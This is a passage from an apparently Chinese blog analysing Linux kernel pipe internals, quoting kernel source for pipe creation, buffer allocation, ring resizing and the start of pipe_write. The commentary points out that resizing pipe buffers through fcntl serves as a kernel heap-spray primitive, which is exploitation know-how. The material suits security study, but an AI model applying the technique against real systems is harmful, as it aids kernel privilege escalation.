class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_pipe_files</span><span class="params">(<span class="keyword">struct</span> file **res, <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> get_pipe_inode();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) {</span><br><span class="line">error = watch_queue_init(inode-&gt;i_pipe);</span><br><span class="line"><span class="keyword">if</span> (error) {</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">""</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) {</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(f);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">f-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line"></span><br><span class="line">res[<span class="number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),</span><br><span class="line">  &amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(res[<span class="number">0</span>])) {</span><br><span class="line">put_pipe_info(inode, inode-&gt;i_pipe);</span><br><span class="line">fput(f);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(res[<span class="number">0</span>]);</span><br><span class="line">}</span><br><span class="line">res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">res[<span class="number">1</span>] = f;</span><br><span class="line">stream_open(inode, res[<span class="number">0</span>]);</span><br><span class="line">stream_open(inode, res[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stream_open is used by subsystems that want stream-like file descriptors.</span></span><br><span class="line"><span class="comment"> * Such file descriptors are not seekable and don't have notion of position</span></span><br><span class="line"><span class="comment"> * (file.f_pos is always 0 and ppos passed to .read()/.write() is always NULL).</span></span><br><span class="line"><span class="comment"> * Contrary to file descriptors of other regular files, .read() and .write()</span></span><br><span class="line"><span class="comment"> * can run simultaneously.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * stream_open never fails and is marked to return int so that it could be</span></span><br><span class="line"><span class="comment"> * directly used as file_operations.open .</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">stream_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span><br><span class="line">{</span><br><span class="line">filp-&gt;f_mode &amp;= ~(FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE | FMODE_ATOMIC_POS);</span><br><span class="line">filp-&gt;f_mode |= FMODE_STREAM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(stream_open);</span><br></pre></td></tr></tbody></table></figure><p>get_pipe_inode函数:</p><ul><li>new_inode_pseudo分配虚拟的inode.</li><li>alloc_pipe_info创建pipe本体pipe_inode_info<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode * <span class="title function_">get_pipe_inode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">goto</span> fail_inode;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_ino = get_next_ino();</span><br><span class="line"></span><br><span class="line">pipe = alloc_pipe_info();</span><br><span class="line"><span class="keyword">if</span> (!pipe)</span><br><span class="line"><span class="keyword">goto</span> fail_iput;</span><br><span class="line"></span><br><span class="line">inode-&gt;i_pipe = pipe;</span><br><span class="line">pipe-&gt;files = <span class="number">2</span>;</span><br><span class="line">pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">inode-&gt;i_fop = &amp;pipefifo_fops;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Mark the inode dirty from the very beginning,</span></span><br><span class="line"><span class="comment"> * that way it will never be moved to the dirty</span></span><br><span class="line"><span class="comment"> * list because "mark_inode_dirty()" will think</span></span><br><span class="line"><span class="comment"> * that it already _is_ on the dirty list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">inode-&gt;i_state = I_DIRTY;</span><br><span class="line">inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;</span><br><span class="line">inode-&gt;i_uid = current_fsuid();</span><br><span class="line">inode-&gt;i_gid = current_fsgid();</span><br><span class="line">inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">fail_iput:</span><br><span class="line">iput(inode);</span><br><span class="line"></span><br><span class="line">fail_inode:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><p>alloc_pipe_info函数.</p><ul><li>kzalloc分配pipe_inode_info的空间</li><li>kcalloc分配pipe_buffer的空间(下面具体分析).<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) {</span><br><span class="line">user_bufs = account_pipe_buffers(user, pipe_bufs, <span class="number">1</span>);</span><br><span class="line">pipe_bufs = <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) {</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">free_uid(user);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><p>pipe_buffer的分配是一次性分配PIPE_DEF_BUFFERS(16)个.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>但可以通过以下调用链重新设置pipe缓冲区的总大小并alloc and copy,即pipe_buffer的数量.堆喷手段get.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipe_fcntl</span><br><span class="line"> -&gt;pipe_set_size</span><br><span class="line">  -&gt;pipe_resize_ring</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Resize the pipe ring to a number of slots.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can shrink the pipe, if arg is greater than the ring occupancy.</span></span><br><span class="line"><span class="comment"> * Since we don't expect a lot of shrink+grow operations, just free and</span></span><br><span class="line"><span class="comment"> * allocate again like we would do for growing.  If the pipe currently</span></span><br><span class="line"><span class="comment"> * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">n = pipe_occupancy(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line"><span class="keyword">if</span> (nr_slots &lt; n)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indices.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">0</span>) {</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> h = head &amp; mask;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t = tail &amp; mask;</span><br><span class="line"><span class="keyword">if</span> (h &gt; t) {</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">       n * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tsize = pipe-&gt;ring_size - t;</span><br><span class="line"><span class="keyword">if</span> (h &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,</span><br><span class="line">       h * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">       tsize * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">head = n;</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;ring_size = nr_slots;</span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;max_usage &gt; nr_slots)</span><br><span class="line">pipe-&gt;max_usage = nr_slots;</span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line">pipe-&gt;head = head;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This might have made more room for writers */</span></span><br><span class="line">wake_up_interruptible(&amp;pipe-&gt;wr_wait);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h2><p>比较长,分段分析.<br>用户数据是通过io向量来存的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> {</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Bit 0 is the read/write bit, set if we're writing.</span></span><br><span class="line"><span class="comment"> * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class="line"><span class="comment"> * the caller isn't expecting to drop a page reference when done.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> type;</span><br><span class="line"><span class="type">size_t</span> iov_offset;</span><br><span class="line"><span class="type">size_t</span> count;</span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kvec</span> *<span class="title">kvec</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> *<span class="title">bvec</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_segs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> start_head;</span><br><span class="line">};</span><br><span class="line">};</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>如果该pipe没有读者 (!pipe-&gt;readers)直接返回-EPIPE.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="type">ssize_t</span> chars;</span><br><span class="line"><span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span 